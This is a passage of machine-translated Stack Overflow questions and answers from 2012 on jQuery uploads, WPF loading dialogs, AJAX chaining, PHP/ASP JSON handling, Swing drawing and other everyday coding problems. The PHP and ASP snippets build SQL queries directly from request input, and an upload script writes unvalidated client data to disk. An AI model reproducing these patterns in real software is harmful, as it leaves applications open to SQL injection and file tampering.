                        var file = e.dataTransfer.files[0];
                        var fileReader = new FileReader();

                        var this_obj = $(this);

                        fileReader.onload = (function(file) {
                            return function(event) {
                                // Preview
                                filename = file.name;
                                image_data = event.target.result;
                                $(this_obj).next().html('<a href="#" class="upload-file">Upload file</a>');
                                $(this_obj).html('<img style="max-width: 200px; max-height: 200px;" src="' + event.target.result + '">');
                            };
                        })(file);

                        fileReader.readAsDataURL(file);         
                    }
                });

                // Upload file
                $(".upload-file").live("click", function(e){
                    e.preventDefault();

                    var this_obj = $(this);
                    var image_data = $(this_obj).parent().prev().find('img').attr('src');

                    $.post(
                        'send_image.php',
                        {
                            data: image_data,
                            filename: filename
                        }, function(response){  
                            $(this_obj).parent().prev().html(response);
                            $(this_obj).remove();
                        }
                    );

                    //console.log('ok');
                });

            });
        </script>
    </head>
    <body>
        <!-- Multiple dropzones -->
        <div class="dropzone">
            Drop files here
        </div>
        <div id="meta"></div>
        <div class="dropzone">
            Drop files here
        </div>
        <div id="meta"></div>
    </body>
</html> 
```

**send_image.php 中的 PHP 代码**

```
<?php
$raw_data = $_POST['data'];

file_put_contents(
    'image123.jpg',
    base64_decode( 
        str_replace('data:image/jpeg;base64,', '', $raw_data)
    )
);
?>

<br>

<?php echo '<img style="max-width: 200px; max-height: 200px;" src="' . 'image123.jpg' . '">'; ?> 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2018-10-05T11:46:57.030

托内尔

感谢您分享您的代码，它对我帮助很大！对于其他发现 IE 边缘的人来说，这是我从@jens-törnell 获得的最终代码，以及在这篇文章[jQuery.on("drop") not fire上给出的建议](https://stackoverflow.com/questions/19223352/jquery-ondrop-not-firing/19223442#19223442)

```
 jQuery(document).ready(function($){
    var filename = '';
    var image_data = '';
    $.event.props.push('dataTransfer');

    $('.dropzone').on({
      dragover: function(e) {
        e.stopPropagation();
        e.preventDefault();
        $(this).addClass('highlight');
        console.log("t3");
        return false; //crucial for 'drop' event to fire
       },
      dragleave: function(e) {
        e.stopPropagation();
        e.preventDefault();
        $(this).removeClass('highlight');
        return false;
       },
       drop: function(e) {
         e.stopPropagation();
         e.preventDefault();
         var file = e.dataTransfer.files[0];
         var fileReader = new FileReader();

         var this_obj = $(this);

         fileReader.onload = (function(file) {
             return function(event) {
                 // Preview
                 filename = file.name;
                 image_data = event.target.result;
                 $(this_obj).next().html('<a href="#" class="upload-file">Upload file</a>');
                 $(this_obj).html('<img style="max-width: 200px; max-height: 200px;" src="' + event.target.result + '">');
             };
         })(file);
         fileReader.readAsDataURL(file);
         return false;
       }
    });

    // Upload file
    $(".upload-file").live("click", function(e){
       e.preventDefault();

       var this_obj = $(this);
       var image_data = $(this_obj).parent().prev().find('img').attr('src');

       $.post(
           'upload-file.php',
           {
               data: image_data,
               filename: filename
           }, function(response){
               $(this_obj).parent().prev().html(response);
               $(this_obj).remove();
           }
       );

     console.log('ok');
 });
```

```
 <div class="dropzone" id="dropzone"><p>Drop files here to upload them.</p></div>
      <div id="meta"></div>
```

# c# - 加载 WPF 数据网格时在新窗口中加载动画

> ID：12954531
> 
> 赞同：1
> 
> 时间：2012-10-18T12:21:42.757
> 
> 标签：c#, wpf, multithreading, user-controls, loading

我发现了这个：[当 wpf 数据绑定发生时如何显示加载图形/动画](https://stackoverflow.com/questions/2114264/how-to-show-a-loading-graphic-animation-when-wpf-data-binding-is-taking-place?answertab=votes#tab-top)

但不明白如何将它应用到我的工作中。

我有我的主窗口。它调用了我所有的用户控件。

在用户控件上，我有一个 DataGrid。按“Go”按钮后，datagrid 从 MySQL 加载数据。这需要很长时间，我想在加载 datagrig 期间显示一个带有“请稍候”的对话框窗口。

我找到了下面的链接，但不明白如何正确调用它。

我需要把这个“加载器”放在像“Loader.cs”这样的新类文件中，然后按钮调用它吗？好的，但是当数据网格完成时如何关闭它？

我迷路了......好吧，如果存在其他解决方案并且只需使用......

提前致谢

**编辑测试 1：**

尝试使用滑块进行简单测试以获得等待时间和按钮。

```
using System;
using System.ComponentModel;
using System.Windows;
using System.Windows.Controls;

namespace TEST_LoadingPage
{
/// <summary>
/// Logique d'interaction pour MainWindow.xaml
/// </summary>
public partial class MainWindow : Window
{
    public MainWindow()
    {
        InitializeComponent();
    }

    private void btnTester_Click(object sender, RoutedEventArgs e)
    {
        Window waitWindow = new Window { Height = 100, Width = 200, WindowStartupLocation = WindowStartupLocation.CenterScreen, WindowStyle = WindowStyle.None };
        waitWindow.Content = new TextBlock { Text = "Veuillez patienter...", FontSize = 30, HorizontalAlignment = HorizontalAlignment.Center, VerticalAlignment = VerticalAlignment.Center };

        BackgroundWorker worker = new BackgroundWorker();
        worker.DoWork += delegate
        {
            Dispatcher.BeginInvoke(new Action(delegate { waitWindow.ShowDialog(); }));
            lbReussite.Visibility = Loop.Pause(slider.Value);
            Dispatcher.BeginInvoke(new Action(delegate() { waitWindow.Close(); }));
        };
        worker.RunWorkerAsync();
    }
}

public class Loop
{
    public static System.Windows.Visibility Pause(double duree)
    {
        try
        {
            DateTime begin = new DateTime();
            DateTime end = new DateTime();
            int i = 0;
            begin = DateTime.Now;
            end = DateTime.Now.AddSeconds(duree);

            while (DateTime.Now <= end)
                i++;

            return System.Windows.Visibility.Visible;
        }
        catch (Exception)
        {
            return System.Windows.Visibility.Hidden;
        }
    }
}
} 
```

但不要与错误一起工作：

> 调用线程无法访问此对象，因为不同的线程拥有它

我知道这是一个 courant 错误，但我没有看到“DispatcherTimer”或者我以前在之前的项目中看到过的……所以我明天会尝试第二个代码。我不明白我把我的方法放在哪里:(

**编辑 2**

我试过你的代码......也许我太愚蠢了。

我已经在 Loader.cs 和 MainWiondow 中编写了这个类（它是一个测试）

```
public partial class MainWindow : Window
{
    public MainWindow()
    {
        InitializeComponent();
    }

    private void btnTester_Click(object sender, RoutedEventArgs e)
    {
        Loader<List<Donnees>> loader = new Loader<List<Donnees>>(GenerateList((int)slider.Value);
        loader.JobFinished += new Loader<Donnees>.OnJobFinished(loader_JobFinished);
        loader.Load();

    }

    private List<Donnees> GenerateList(int number)
    {
        List<Donnees> list = new List<Donnees>();
        for (int i = 1; i <= number; i++)
        {
            Donnees data = new Donnees();
            data.Id = i;
            data.Name = "Ligne " + i;
            list.Add(data);
        }
        return list;
    }

    void loader_JobFinished(object sender, List<Donnees> result)
    {
        result = GenerateList((int)slider.Value);
        dgDataGrid.ItemsSource = result;
    }

}

public class Donnees
{
    #region Properties

    private int id;
    public int Id
    {
        get { return id; }
        set { id = value; }
    }

    private string name;
    public string Name
    {
        get { return name; }
        set { name = value; }
    }

    #endregion

    public Donnees()
    {
        id = -1;
        name = "";
    }
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-18T12:37:18.853

您将以下代码放在 DataGrid-UserControl 代码隐藏的方法中，该方法在您的按钮单击事件处理程序中调用：

```
Window waitWindow = new Window { Height = 100, Width = 200, WindowStartupLocation = WindowStartupLocation.CenterScreen, WindowStyle = WindowStyle.None };
waitWindow.Content = new TextBlock { Text = "Please Wait", FontSize = 30, FontWeight = FontWeights.Bold, HorizontalAlignment = HorizontalAlignment.Center, VerticalAlignment = VerticalAlignment.Center }; 
```

现在你可以决定...

...如果您想创建一个 DataLoader 类，它会加载数据并在完成时触发 DataLoaded 事件，请添加：

```
BackgroundWorker worker = new BackgroundWorker();
worker.DoWork += delegate
{
    Dispatcher.BeginInvoke(new Action(delegate { waitWindow.ShowDialog(); }));
    DataLoader dataLoader = new DataLoader();
    dataLoader.DataLoaded += delegate
    {
        Dispatcher.BeginInvoke(new Action(delegate() { waitWindow.Close(); }));
    };

    dataLoader.LoadData();
};

worker.RunWorkerAsync(); 
```

...或者如果您只是将数据加载代码复制到此方法中并添加：

```
BackgroundWorker worker = new BackgroundWorker();
worker.DoWork += delegate
{
    Dispatcher.BeginInvoke(new Action(delegate { waitWindow.ShowDialog(); }));
    //do dataloading here
    Dispatcher.BeginInvoke(new Action(delegate() { waitWindow.Close(); }));
};
worker.RunWorkerAsync(); 
```

编辑：我写了一个类，它应该做你想做的事，而无需在代码隐藏中使用太多代码：

```
public class Loader<TFuncResult,TFirstArgType>:FrameworkElement
{
    private Func<TFirstArgType,TFuncResult> _execute;
    public TFuncResult Result { get; private set; }

    public delegate void OnJobFinished(object sender, TFuncResult result);
    public event OnJobFinished JobFinished;

    public Loader(Func<TFirstArgType,TFuncResult> execute)
    {
        if (execute == null)
            throw new ArgumentNullException("execute");

        _execute = execute;
    }

    private Window GetWaitWindow()
    {
        Window waitWindow = new Window { Height = 100, Width = 200, WindowStartupLocation = WindowStartupLocation.CenterScreen, WindowStyle = WindowStyle.None };
        waitWindow.Content = new TextBlock { Text = "Please Wait", FontSize = 30, FontWeight = FontWeights.Bold, HorizontalAlignment = HorizontalAlignment.Center, VerticalAlignment = VerticalAlignment.Center };

        return waitWindow;
    }

    public void Load(TFirstArgType firstarg, Window waitWindow = null)
    {
        if (waitWindow == null)
        {
            waitWindow = GetWaitWindow();
        }
        BackgroundWorker worker = new BackgroundWorker();
        worker.DoWork += delegate
        {
            Dispatcher.BeginInvoke(new Action(delegate { waitWindow.ShowDialog(); }));
            Result = _execute(firstarg);
            Dispatcher.BeginInvoke(new Action(delegate() { waitWindow.Close(); }));
        };
        worker.RunWorkerCompleted += delegate
        {
            worker.Dispose();
            if (JobFinished != null)
            {
                JobFinished(this, Result);
            }
        };
        worker.RunWorkerAsync();
    }
} 
```

编辑2：如何使用它：

假设您的`GenerateList()`返回数据类型`List<Donnees>`和参数类型是类型`int`（适用于所有类型）：

将此放置在您要加载数据的位置（例如，在您的 Window_Loaded-Event 中）：

```
Loader<List<Donnees>, int> loader = new Loader<List<Donnees>, int>(GenerateList);
loader.JobFinished += new Loader<List<Donnees>, int>.OnJobFinished(loader_JobFinished);
loader.Load((int)slider.Value); 
```

现在在 Code-Behind 中调用这个 EventHandler：

```
void loader_JobFinished(object sender, List<Donnees> result)
{
    YourDataGrid.DataSource = result
} 
```

# ajax - 同步两个ajax jquery函数

> ID：12954533
> 
> 赞同：0
> 
> 时间：2012-10-18T12:21:47.000
> 
> 标签：ajax, jquery

我有两个jQuery的功能。这两个函数都在调用 jQuery ajax。
两者都有属性 async: false。
在这两个函数中，我都根据一些 ajax 响应条件进行重定向。

在第一个函数的成功中，我调用了另一个函数，然后重定向到另一个页面。但是我的第一个函数没有重定向，因为我的第二个函数没有等待第一个函数的响应。
希望问题从我的问题中很清楚。

我的第一个功能如下

```
function fnGetCustomer() {
function a(a) {
    $("#loading").hide();
    //on some condition
    //other wise no redirection
    self.location = a;
}
var b = $("input#ucLeftPanel_txtMobile").val();

"" != b && ($("#loading").show(), $.ajax({
    type: "POST",
    url: "Services/GetCustomer.ashx",
    data: { "CustMobile": b },
    success: a,
    async: false,
    error: function () {
        $("#loading").hide();
    }
})); 
```

}

我的第二个函数我正在调用第一个函数

```
function fnSecond() {
    $.ajax({
    type: "POST",
    url: "some url",
    async: false,
    data: { "CustMobile": b },
    success: function(){ 
       fnGetCustomer();
       //if it has all ready redirected then do not redirect
        // or redirect to some other place 
     },
    error: function () {

        $("#loading").hide();
    }

})); 
```

}

我正在使用我的第一个功能。所以我不想改变我的第一个功能。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-18T12:32:51.277

这样的设置应该可以工作；

```
$.ajax({
    data: foo,
    url: bar
}).done(function(response) {
    if (response == "redirect") {
        // redirect to some page
    } else {
        $.ajax({
            data: foo,
            url: bar
        }).done(function(response2) {
            if (response2 == "redirect") {
                // redirect to some other page
            } else {
                // do something else
            }
        });
    }
});​ 
```

我还没有测试过这样的事情，但这大致就是我开始的方式

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-18T12:52:31.647

如果您不需要第一个 AJAX 调用的结果来发送第二个，您可以添加一个计数器来跟踪调用。由于您可以同时发送两个呼叫，因此响应速度会更快。

```
var requestsLeft = 2;

$.ajax({
    url: "Firsturl.ashx",
    success: successFunction
});

$.ajax({
    url: "Secondurl.ashx",
    success: successFunction
});

function successFunction()
{
    requestsLeft--;
    if (requestsLeft == 0)
        doRedirectOrWhatever();
} 
```

如果你绝对需要这样做，你可以做这样的事情。我的示例需要一个 json 响应，但这不是这种方法起作用的要求。

```
var ajaxurls = ["Firsturl.ashx",  "Secondurl.ashx"]

function doAjax()
{
    $.ajax({
        url: ajaxurls.shift(), // Get next url
        dataType: 'json',
        success: function(result)
        {
            if (result.redirectUrl) // or whatever requirement you set
                /* redirect code goes here */
            else if (ajaxurls.length>0) // If there are urls left, run next request
                doAjax();
        }
    });
}
doAjax(); 
```

# php - JSON 解析：PHP 代码到 ASP

> ID：12954537
> 
> 赞同：-1
> 
> 时间：2012-10-18T12:22:04.040
> 
> 标签：php, mysql, asp-classic, json

在我的测试中，我使用`PHP`转换`json`字符串以将其插入`mysql`数据库。

这是 php 文件的样子：

```
if (isset($_GET['data'])) {  // Is er data binnengekomen, zoja voer dan de rest uit
$data = json_decode($_GET['data'], true); 
$id = $data['id'];                          //Het personeelsnummer
$latitude = $data['latitude'];              // De latitude (coordinaten)
$longitude = $data['longitude'];            // De longitude (coordinaten)
$timestamp = $data['timestamp'];            // De tijd

$result = mysql_query("SELECT * FROM locatie WHERE id='$id'");      //Kijken of het personeelsnummer al in de database staat of niet
if(mysql_num_rows($result)>0)                                       //Hier wordt de functie uitgevoerd als het al in de database staat
{
$query = "Update locatie                                            
SET     longitude = '$longitude',
   latitude = '$latitude',
   timestamp = '$timestamp'
WHERE id = '$id'";  

$result = mysql_query($query) or die('Query failed: ' . mysql_error());
echo "OK";

// Voer de $query(de Update Functie) uit
mysql_free_result($result); 

    }                               // Als het er in staat, Update alle waardes die voor het personeelsnummer gelden. Wordt dus geen geschiedenis opgeslagen
else                                                                    //Hier wordt de functie uitgevoerd als het nog niet in de database staat

{
//Als het een nieuw nummer is
$query = sprintf("INSERT INTO locatie (id, longitude, latitude, timestamp) VALUES ('%s', '%s', '%s', '%s') ", mysql_real_escape_string($id) , mysql_real_escape_string($longitude),    mysql_real_escape_string($latitude), mysql_real_escape_string($timestamp));}               // Als het er nog niet instaat voeg dan het personeelsnummer in en de andere waardes.         

$result = mysql_query($query) or die('Query failed: ' . mysql_error());
echo "OK";

// Voer de $query(de Insert Functie) uit
mysql_free_result($result);
} 
```

这工作得很好，但公司要求它应该在 ASP 中。

但关键是，我只是不擅长asp。

这是我的代码：

```
<%@LANGUAGE="VBSCRIPT" CODEPAGE="65001"%>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<title>Naamloos document</title>
</head>

<body>

    <% 
    Dim sConnection, objConn , objRS 

    sConnection = "DRIVER={MySQL ODBC 3.51 Driver}; SERVER=localhost; DATABASE=Your_Mysql_DB;   UID=mysql_username;PASSWORD=mysql_password; OPTION=3" 

    Set objConn = Server.CreateObject("ADODB.Connection") 

    objConn.Open(sConnection) 

    If Request.Form("data") <> "" Then

    Request.QueryString["id"] 
    Request.QueryString["longitude"] 
    Request.QueryString["latitude"] 
    Request.QueryString["timestamp"] 

    Set objRS = objConn.Execute("SELECT * FROM locatie WHERE id='id'")

    If objRS <> "" Then
    Set objRS = objConn.Execute("Update locatie                                             
    SET     longitude = 'longitude',
       latitude = 'latitude',
       timestamp = 'timestamp'
    WHERE id = 'id'")
    Else
    Set objRS = objConn.Execute("INSERT INTO locatie (id, longitude, latitude, timestamp)  VALUES ('id', 'longitude', 'latitude', 'timestamp') ")
    End If

    objRS.Close
    Set objRS = Nothing
    objConn.Close
    Set objConn = Nothing
    %>

    </body>
    </html> 
```

我发送这个jsonstring：

```
2012-10-10 08:50:32.011 Appname[4049:c07] Post String =http://www.yourdomain.nl/locatie.asp?data=%7B%22id%22:%220612833397%22,%22longitude%22:%22-143.406417%22,%22latitude%22:%2232.785834%22,%22timestamp%22:%2210-10%2007:56%22%7D 
```

**编辑**

所以我的问题是：

如果 ASP 就像 PHP 文件一样工作。我不知道我是否使用正确的方法来解码 json，如果我在数据库中使用正确的方法，如果 id=id，如果我使用正确的方法在数据库中解析它

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-18T13:37:34.063

ASP 只是与 php 有细微的相似之处，但 ASP 的扩展、API 等较少。

根据定义，ASP (Classic-ASP) 很久以前就被弃用了，并且只在当前的 Windows 版本中维护，只是为了符合向后兼容性。但是该语言不再由 miosoft 开发。

说到这里，您必须知道 ASP*本身*无法解析 JSON ，相反您需要实现一个外部库，您可以查看[Classic asp 服务器端 JSON 库](https://stackoverflow.com/questions/2292575/classic-asp-server-side-json-library)以获取更多信息。

在其他方面，我注意到您在您的代码中检测到的一些错误：

*   在*Request.QueryString[XXXXXX]* **[]**字符中无效，用**()**代替。
*   你永远不会关闭*If Request.Form("data") <> "" Then*

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-18T13:38:34.107

您正在混淆 Request.Form 和 Request.Querystring 集合。由于在您的示例中您在查询字符串（GET）中发送数据，因此您应该使用 Request.Querystring 集合。

因此 ln20 应该是

```
If Request.Querystring("data") <> "" Then 
```

代替

```
If Request.Form("data") <> "" Then 
```

如果你的 json 能顺利通过，也很难评估。你可以测试这个，使用 response.write Request.Querystring("data") 来查看实际的 jsonstring。我建议使用 jsonlint.com

编辑：最后，正如 Rafael 在另一篇文章中提到的那样，您确实需要第三方库，因为没有内置的 json_decode 模拟。我个人喜欢 SO post 的解决方案[Any good library for parsing JSON in Classic ASP?](https://stackoverflow.com/questions/1019223/any-good-libraries-for-parsing-json-in-classic-asp) 他们建议使用 Douglas Crockford 的 json2.js javascript 库服务器端。

# java - 单击 JPanel 以绘制形状

> ID：12954541
> 
> 赞同：2
> 
> 时间：2012-10-18T12:22:23.913
> 
> 标签：java, swing, graphics, drawing, jpanel

我有一个包含 3 个 JPanel 的 JFrame；选项、菜单、画布。在选项中有许多代表形状的 JButton。目的是单击形状（例如矩形）的 JButton，然后单击画布上的任意位置，形状将在那里绘制。由于某种原因，形状并不总是被绘制出来，只有当我单击画布左上角的某个地方时才会绘制出来。此外，形状似乎会根据我点击的位置随机改变大小。

这是我的一些代码片段，这可能是一个小错误，但我似乎无法找到它。

形状：

```
public class Shape extends JPanel {

    protected int xLocation;
    protected int yLocation;
    protected int numberOfSides; 
    protected String areaInfo; 
    protected String perimeterInfo; 

    public int getXLocation() {
        return xLocation;
    }

    public void setXLocation(int xLocation) {
        this.xLocation = xLocation;
    }

    public int getYLocation() {
        return yLocation;
    }

    public void setYLocation(int yLocation) {
        this.yLocation = yLocation;
    }

    public int getNumberOfSides() {
        return numberOfSides;
    }

    public Shape(int xLocation, int yLocation, int numberOfSides) {
        this.xLocation = xLocation;
        this.yLocation = yLocation;
        this.numberOfSides = numberOfSides;
    }
} 
```

长方形：

```
import java.awt.Color;
import java.awt.Graphics;

public class Rectangle extends Shape {

    private int width;
    private int height;

    public int getWidth() {
        return width;
    }

    public void setWidth(int width) {
        this.width = width;
    }

    public int getHeight() {
        return height;
    }

    public void setHeight(int height) {
        this.height = height;
    }

    public Rectangle(int xLocation, int yLocation, int width, int height ) {
        super(xLocation, yLocation, 4);
        this.width = width;
        this.height = height;
        this.areaInfo = "Multiply width * height";
        this.perimeterInfo = "Add the lengths of each side";
    }

    public void paint(Graphics g){
        g.setColor(Color.BLACK);        
        g.fillRect(xLocation, yLocation, width, height);
    }
} 
```

帆布：

```
public class DrawingCanvas extends JPanel implements Serializable{

    private ArrayList<Shape> shapeList;
    OptionsPanel options;

    public void addShape(Shape shape){
        shapeList.add(shape);
        this.add(shape);
        this.repaint();
    }

    public DrawingCanvas(){
        shapeList = new ArrayList<Shape>();
    }

} 
```

框架：

```
public class DrawingFrame extends JFrame implements MouseListener, MouseMotionListener {

    private OptionsPanel options;
    private DrawingCanvas canvas;
    private MenuBar menu;
    Shape s; //shape to be manipulated

    public DrawingFrame(){
        options = new OptionsPanel();
        canvas = new DrawingCanvas();
        menu = new MenuBar();

        //options.setBounds(0, 0, 100, 500);
        options.setBackground(Color.GREEN);
        canvas.setBackground(Color.yellow);
        menu.setSize(1000,200);
        menu.setBackground(Color.magenta);

        this.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        this.setSize(1000,500);
        this.setTitle("Drawing Application");

        this.setLayout(new BorderLayout());
        this.getContentPane().add(options, BorderLayout.WEST);
        this.getContentPane().add(canvas, BorderLayout.CENTER);
        this.getContentPane().add(menu, BorderLayout.PAGE_START);
        this.setVisible(true);

        options.createRectangleButton.addMouseListener(this);
        options.createSquareButton.addMouseListener(this);
        options.createCircleButton.addMouseListener(this);
        options.createTriangleButton.addMouseListener(this);
        options.clearButton.addMouseListener(this);
        canvas.addMouseListener(this);
        canvas.addMouseMotionListener(this);

    }

    @Override
    public void mouseClicked(MouseEvent e) {
        boolean createShape = true;

        if(e.getSource().equals(options.createRectangleButton)){
            createShape = true;
            s = new Rectangle(50,50,400,200);
            s.addMouseListener(this);
            s.addMouseMotionListener(this); 
        }

        if (e.getSource().equals(canvas) && createShape == true){
            s.setXLocation(e.getX());
            s.setYLocation(e.getY());
            createShape = false;
            canvas.addShape(s);
        } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-18T17:49:41.213

没有[完整的例子](http://sscce.org/)，很难说。我希望您`DrawingCanvas`能够覆盖`paintComponent()`以将累积的`Shape`实例呈现在`shapeList`. 您可以将您的方法与[此处](https://stackoverflow.com/a/11944233/230513)`GaphPanel`引用的方法进行比较。

![图片](../Images/8ff0aa2210f68fb48bd57b1a5304741e.png)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-18T18:26:45.020

您提供的代码不完整，但无论如何问题出在您的`mouseClicked`方法中，如果您将第二个更改`if`为类似以下内容，例如：

```
 if (e.getSource().equals(canvas) && createShape == true){
        int x = e.getX();
        int y = e.getY();
        s = new Rectangle(x,y,x+50,y+50);
        canvas.addShape(s);
    } 
```

然后，每当您单击画布时，将绘制一个宽度和高度为 50 的矩形，具体取决于您的 x、y 位置（您可以使用基于用户输入的变量来更改固定的宽度/高度）。另外，我不确定您在第一`if`部分中要做什么，您将 a`MouseListener`添加到未添加到画布的新创建的形状中，我想您还想做其他事情...

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-02T14:06:18.670

我不得不覆盖画布类的绘画方法；在画布类中调用 super.paint 并单独重新绘制每个形状

```
public void paint(Graphics g){
            super.paint(g);
            for(int i=0;i<shapeList.size();i++){
                ((Shape)shapeList.get(i)).paint(g);
            }
        } 
```

# android - 如何在 android 的空气应用程序中运行 swf 文件

> ID：12954542
> 
> 赞同：2
> 
> 时间：2012-10-18T12:22:25.080
> 
> 标签：android, air, flash

我想用 android mobile 运行一个 .swf 文件。实际上，我打算将现有的 .swf 文件与我的 android 手机（如farmwille）一起使用。我已经通过使用谷歌浏览器上的检查元素下载了源 .swf 文件。但是安卓手机不支持flash文件。我应该怎么做才能在手机中使用这些应用程序？我阅读了一些关于编写新 AIR 应用程序并将 .swf 作为新包嵌入的内容。有什么可以做的吗？我目前只有 .swf 文件。提前致谢..

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-23T17:57:11.587

请参阅[这篇文章](https://stackoverflow.com/questions/11552710/from-swf-to-air-to-ios-application)以获取有关如何为 iOS 执行此操作的示例。

Android 基本上是一样的：

*   使用命令行和 Air SDK 的 Captive Runtime，这将允许您使用`adt -package`命令将 .swf 更改为您需要的任何格式。（你可能想要.apk）

*   [或者你可以下载像 Flash Builder 4.6 这样的 IDE，像这样](http://helpx.adobe.com/x-productkb/multi/how-overlay-air-sdk-flex-sdk.html)在 Flex SDK 上覆盖 Air SDK，然后为你的目标平台打包你的应用程序。

即使命令行对您来说似乎令人生畏，我也建议您这样做。

# c++ - 两点围绕同一中心旋转但距离增加

> ID：12954544
> 
> 赞同：0
> 
> 时间：2012-10-18T12:22:26.750
> 
> 标签：c++, rotation, trigonometry

我想实现两点相互旋转。因此，我使用旋转矩阵。但是，我现在遇到的问题是点之间的距离正在增加（请参阅附加视频[1](https://www.dropbox.com/s/0cifen1b7jx5d2z/output2.avi)）。然而，在我的整个模拟过程中，距离应该保持不变。

这是我用于计算速度的代码：

其中 p1 和 p2 是两个点。

```
double xPos = p0.x+p1.x;
double yPos = p0.y+p1.y;
//The center between p1 and p2
xPos /=2;
yPos /=2;
//the rotating angle
double omega = 0.1;
//calculate the new positions
double x0new = xPos + (p0.x-xPos)*std::cos(omega) - (p0.y-yPos)*std::sin(omega);
double y0new = yPos + (p0.x-xPos)*std::sin(omega) + (p0.y-yPos)*std::cos(omega);
double x1new = xPos + (p1.x-xPos)*std::cos(omega) - (p1.y-yPos)*std::sin(omega);
double y1new = yPos + (p1.x-xPos)*std::sin(omega) + (p1.y-yPos)*std::cos(omega);
//the speed is exatly the difference as I integrate one timestep
p0.setSpeed(p0.x-x0new, p0.y-y0new);
p1.setSpeed(p1.x-x1new, p1.y-y1new); 
```

然后我将速度精确地整合一个时间步长。我的计算出了什么问题？

***更新*** 看来我的集成是错误的。如果我直接设置位置，它就完美了。但是我现在不知道这种集成有什么问题：

```
setSpeed(ux,uy){
     ux_=ux;
     uy_=uy;
}
// integrate one timestep t = 1
move(){
     x = x + ux_;
     y = y + uy_;
} 
```

[我的行为视频](https://www.dropbox.com/s/0cifen1b7jx5d2z/output2.avi)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-18T12:30:51.087

乍一看，主要原因是您在每次迭代中更新`p0`和`p1`协调。这会累积不准确，这些不准确可能来自`setSpeed`.

相反，您应该使用恒定的初始坐标`p0`和`p1`，但增加`omega`角度。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-18T12:37:45.123

这段代码没有明显错误，但未显示的“速度”积分表明您可能在新旧位置之间进行线性积分，这会使轨道在速度 > 标称速度时扩大，而在速度 < 时收缩标称速度。

正如我所怀疑的那样。积分实际上是在点 p0 和 p1 之间的线段的外推，这些点应该与原点有固定距离（物理模拟可能会使轨迹椭圆......）

因此，如果外推因子为 0，则新位置将位于计算的周长上。如果它是 < 0（并且 > -1），那么您将在预期轨迹内进行插值。

```
 O     This beautiful ascii art is trying to illustrate the integration
        /      x is the original position, o is the new one and O is the 
       / ___-----   "integrated" value and the arc is a perfect circle :)
      o--      Only at the calculated position o, there is no expansion.
   --/
  / /
 / /
| /
x 
```

# delphi - 奇怪的 WM_CHAR 行为（错误的 chCharCode）

> ID：12954545
> 
> 赞同：1
> 
> 时间：2012-10-18T12:22:27.233
> 
> 标签：delphi, winapi, delphi-2009

我需要自动输入某个字符（俄语字母`Э`）。在 Spy++ 中，相应的消息如下所示：

`WM_CHAR chCharCode: '221' (221) cRepeat:1 ScanCode:28 fExtended:0 fAltDown:0 fRepeat:0 fUp:0`

![在此处输入图像描述](../Images/de1b455d3560cf7f11d0dae16ab9a64d.png)

为了以编程方式发送此消息，我使用以下 Delphi 代码：

`SendMessage(Self.PassengerGrid, WM_CHAR, WPARAM(221), LPARAM($280001));`

当我检查在 Spy++ 中运行代码的结果时，我看到以下消息：

`WM_CHAR chCharCode: '89' (89) cRepeat:1 ScanCode:28 fExtended:0 fAltDown:0 fRepeat:0 fUp:0`

`wParam`我的电话一定有问题`SendMessage`。

我该如何修复它（以便`chCharcode`等于`221`）`？

**更新1：**

*   发生此错误的机器有两种键盘语言 - 英语和俄语。
*   我注意到当下面的代码

    SendMessage(MyGridHandle, WM_KEYDOWN, VK_OEM_7, LPARAM($390000)); SendMessage(MyGridHandle, WM_CHAR, WPARAM(221), LPARAM($280001)); SendMessage(MyGridHandle, WM_KEYUP, VK_OEM_7, LPARAM($c0390001));

执行时，所选语言（根据托盘图标）从俄语变为英语。

*   无论我在 WM_CHAR 中传输什么字符，`WPARAM`消息的始终是`0x59`( `89`)。

**更新 2：**使用`WM_UNICHAR`而不是`WM_CHAR`没有帮助。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-18T13:49:08.660

您应该将字符的 UTF-16 代码作为 WPARAM 发送（对于俄语 'Э' 是 1069），例如：

```
procedure TForm1.Button1Click(Sender: TObject);
begin
  PostMessage(Edit1.Handle, WM_CHAR, WPARAM(1069), LPARAM(0));//$280001));
end; 
```

# c++ - 循环依赖——前向声明还不够

> ID：12954546
> 
> 赞同：-3
> 
> 时间：2012-10-18T12:22:29.917
> 
> 标签：c++, header, dependencies, header-files

格式化代码： http: [//pastie.org/5074835](http://pastie.org/5074835)

我在 Entity 类和 Component 类之间存在循环依赖关系。我尝试转发类声明，但我必须访问 Component 的更新方法，而我不能这样做。

有没有办法在不重新设计的情况下完成这项工作？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-18T12:24:31.180

你需要`#include "Entity.h"`在`Component.cpp`.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-18T12:26:37.540

`Entity.h`包含in`Component.cpp`和`Component.h`in没有问题`Entity.cpp`。如果将它们包含在头文件中，则将是循环依赖。所以继续使用`#include "Entity.h" in`Component.cpp`。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-18T12:25:52.283

用所有方法声明两个类，然后定义方法？

标题：

```
class B;

class A {
   void method1(B b);
};

class B {
   void method2(A a);
} 
```

源文件：

```
void A::method1(B b){
   ...
}

void B::method2(A a){
   ...
} 
```

# sympy - sympy 方程的solve() 命令！= 0

> ID：12954552
> 
> 赞同：1
> 
> 时间：2012-10-18T12:22:40.777
> 
> 标签：sympy

正如我在 sympy 文档中所读到的，solve() 命令期望一个方程求解为等于零。
